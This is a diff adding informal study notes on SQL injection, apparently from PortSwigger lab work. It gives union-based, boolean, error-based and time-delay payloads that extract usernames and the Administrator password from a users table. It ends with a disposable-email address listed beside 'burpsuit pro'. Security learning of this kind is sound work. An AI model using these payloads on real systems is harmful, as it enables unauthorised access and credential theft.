@@ -1,0 +1,63 @@
+Simple sql injection (NO spcaces use `+` instead between string )
+========================
+Submitting the single quote character ' and looking for errors or other anomalies.
+	cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+	In UPDATE statements, within the updated values or the WHERE clause.
+	In INSERT statements, within the inserted values.
+	In SELECT statements, within the table or column name.
+		`'`
+		`'--`
+		`' UNION SELECT username, password FROM users--`
+			For a UNION query to work, two key requirements must be met:
+				The individual queries must return the same number of columns.
+					`' ORDER BY 1--` and increase the # on by one
+					`' UNION SELECT NULL--` and then increase the no of null one by one
+						in url it would be like `' UNION + Select + NULL, NULL --
+				The data types in each column must be compatible between the individual queries.
+					`' UNION SELECT 'a',NULL,NULL,NULL--` and shift the datatype one by one like `' UNION SELECT NULL,'a',NULL,NULL--`
+					on oracle we could concatenate the columns `' UNION SELECT username || '~' || password FROM users--`
+	
+	In SELECT statements, within the ORDER BY clause.
+
+
+Blind sql injection
+======================
+
+Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic 
+differences in the resulting application responses.
+
+
+
+Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
+	`' AND (select SUBSTR(password,21,1) from users limit 1)='§a§`
+	`xyz' AND 'b'='a`
+	`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
+	`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+	https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors
+	`CAST((SELECT example_column FROM example_table) AS int)`
+	
+
+Submitting payloads designed to trigger time delays when executed within a SQL query, and looking for differences in the time taken to respond.
+
+	`'; IF (1=2) WAITFOR DELAY '0:0:10'--`
+		e.g. '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+
+
+
+
+Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitoring for any resulting interactions.
+
+
+
+
+Blind injection question
+https://portswigger.net/web-security/sql-injection/blind
+
+
+
+
+
+burpsuit pro: https://www.minuteinbox.com/
+	shamari.rhylan@madeforthat.org
